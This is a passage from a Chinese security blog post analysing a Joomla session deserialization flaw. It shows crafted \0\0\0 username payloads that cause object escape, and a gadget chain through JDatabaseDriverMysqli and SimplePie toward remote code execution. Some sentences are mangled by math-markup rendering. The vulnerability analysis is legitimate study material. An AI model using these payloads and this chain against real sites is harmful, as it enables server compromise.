&lt;p&gt;Joomla 不论账号密码是否正确，都会把登录的用户名和密码，通过序列化的方式存储在 session 表中，再以反序列化的方式读取 session 表中的内容。由于 protected 修饰的变量在序列化的时候，会变成 \x00 + * + \x00 + [变量名] 的形式，而 mysql 无法保存 NULL 字节的数据，所以在向 session 表写入的过程中会将 \x00*\x00 替换为 \0\0\0 ，同样在读取 session 表中的内容的时候会再次转换，然后进行反序列化。如果在向 session 表存储的过程中构造恶意构造一些 \0\0\0，那么在进行反序列化的时候就会由于字节数对不上，导致 “溢出” ，使得反序列化对象逃逸出来。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果上面这段没看懂，可以看上面利用章节的对象逃逸，如果还看不懂就退学吧&lt;/p&gt;
&lt;p&gt;尝试使用错误的账号密码登录，查看一下 session 表中的内容：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028001846145-1227489260.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;在登录过程中，会有一个 303 的跳转，这个跳转是先把用户的输入经过序列化存储在 session 表中，读取的时候再从 session 表中取出数据进行反序列化，进行账号密码对比&lt;/p&gt;
&lt;p&gt;通过序列化写入 session 表的具体代码如下：&lt;/p&gt;
&lt;p&gt;Joomla/libraries/joomla/session/storage/database.php ——&amp;gt; write()&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1344396/202010/1344396-20201028225321914-653179029.png&#34;&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028225321914-653179029.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;因为 protected 修饰的变量在序列化后会变成这种形式：\x00 + * + \x00 + [变量名]，而 mysql 无法保存 NULL 字节的数据，所以在代码中可以看到在写入 session 表的过程中会将 \x00*\x00 替换为 \0\0\0 来进行存储，就比如 Registry 类下 protected 修饰的 $data 变量，序列化存储为：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1344396/202010/1344396-20201028231208408-1317263109.png&#34;&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028231208408-1317263109.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;通过反序列化读取 session 表的具体代码如下：&lt;/p&gt;
&lt;p&gt;Joomla/libraries/joomla/session/storage/database.php ——&amp;gt; read()&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028225519116-1363963610.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;在读取时会重新把 \0\0\0 替换为 \x00*\x00 来进行反序列化。&lt;/p&gt;
&lt;p&gt;因此反序列化存入 session 表中的数据比原始数据要多 3 个字节&lt;/p&gt;
&lt;p&gt;如果传入的用户名为 \0\0\0admin，序列化写入 session 表中的数据为：&lt;/p&gt;
&lt;p&gt;在调用 read 方法进行读取时会先将 \0\0\0 转换为 N*N（\x00 为空字节为方便展示这里使用 N 代替）：&lt;/p&gt;
&lt;p&gt;\0\0\0admin&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;s:8:&amp;quot;username&amp;quot;;s:11:&amp;quot;N*Nadmin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为 read 之后长度变短了 3 个字节，在反序列化的时候 username 的值为 s:11:“N&lt;em&gt;Nadmin&amp;quot;，但是实际只有 8 个字节，为了满足反序列化的规则，就会吃掉后面 3 个字节的数据，直至凑齐 11 个字符，也就是 s:11:&amp;quot;N&lt;/em&gt;Nadmin”;s。&lt;/p&gt;
&lt;p&gt;利用这个思路，足够多的 \0\0\0 就可以将 password 字段的数据逃逸出来，构造如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;s:8:s:&amp;quot;username&amp;quot;;s:54:&amp;quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;read () 之后：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;s:8:s:&amp;quot;username&amp;quot;;s:54:&amp;quot;N*NN*NN*NN*NN*NN*NN*NN*NN*N&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;12345&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;username 的值为 N&lt;em&gt;NN&lt;/em&gt;NN&lt;em&gt;NN&lt;/em&gt;NN&lt;em&gt;NN&lt;/em&gt;NN&lt;em&gt;NN&lt;/em&gt;NN*N&amp;quot;;s:8:“password”;s:6:&amp;quot;12345，后面补上 &amp;quot; 和；就成功逃逸出来了&lt;/p&gt;
&lt;p&gt;实现对象注入：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;s:8:s:&amp;quot;username&amp;quot;;s:54:&amp;quot;N*NN*NN*NN*NN*NN*NN*NN*NN*N&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;12345&amp;quot;;s:2:&amp;quot;HS&amp;quot;:O:15:&amp;quot;ObjectInjection&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里来分析一下利用链，通过搜索 eval/assert/call_user_func… 这类可以利用并且参数可控的危险函数，可以找到用于构造执行链的类：&lt;/p&gt;
&lt;p&gt;这几个文件调取 call_user_func 的方式都相同，来看一下 libraries\joomla\database\driver\mysqli.php 中方法的具体实现&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221114210130490.png&#34; alt=&#34;image-20221114210130490&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031162618304-261047353.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;当 JDatabaseDriverMysqli 这个类的对象被调用，在结束时都会调用析构函数__destruct，__destruct 中会调用 disconnect () 方法。&lt;/p&gt;
&lt;p&gt;而当&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;为&lt;/mtext&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt;的时候，就会调用&lt;/mtext&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;this-&amp;gt;connection为true的时候，就会调用call_user_func_array(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.77777em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.036108em;vertical-align:-0.286108em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;为&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;时&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;候&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;就&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;会&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;调&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;用&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;u&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3361079999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.286108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;a&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;h, array(&amp;amp;this)); 方法对disconnectHandlers数组中的每个值，都会执行call_user_func_array()，并将&amp;this 作为参数引用，但是不能控制参数，所以不能直接构造 assert+eval 来执行任意代码。&lt;/p&gt;
&lt;p&gt;继续往下看发现在 libraries\simplepie\simplepie.php 中有一处 call_user_func 方法调用&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031171046685-27582232.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个 call_user_func ($this-&amp;gt;cache_name_function, &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mtext&gt;两个参数都是可控的，于是只要满足&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;this-&amp;gt;feed_url)两个参数都是可控的，于是只要满足&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.77777em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;u&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;两&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;个&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;参&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;都&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;是&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;可&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;控&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;于&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;是&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;只&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;要&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;满&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;足&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; this-&amp;gt;cache 为 True，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mtext&gt;为&lt;/mtext&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt;，&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;this-&amp;gt;raw_data为True，&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.77777em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;为&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;parsed_feed_url [‘scheme’] 不为空就能够 RCE 了，并且 $parsed_feed_url [‘scheme’] 可以能够利用 || $a=‘http//’; 绕过 scheme 的解析&lt;/p&gt;
&lt;p&gt;不过这个 call_user_func 属于 init () 方法，并不属于魔术方法，所以需要结合前面 JDatabaseDriverMysqli 类下的 disconnect () 中的 call_user_func_array 方法实现对 init () 方法的回调。就相当于：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$this-&amp;gt;disconnectHandlers = array(&amp;quot;test&amp;quot;=&amp;gt;array(new SimplePie(),&amp;quot;init&amp;quot;));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这样的话就相当于实例化了一个 SimplePie 类的对象，并且调用 SimplePie 类下的 init () 方法。&lt;/p&gt;
&lt;p&gt;这里还有一个问题，虽然实例化了一个 SimplePie 的类，但是 SimplePie 类不会自动加载。需要去引入加载类。&lt;/p&gt;
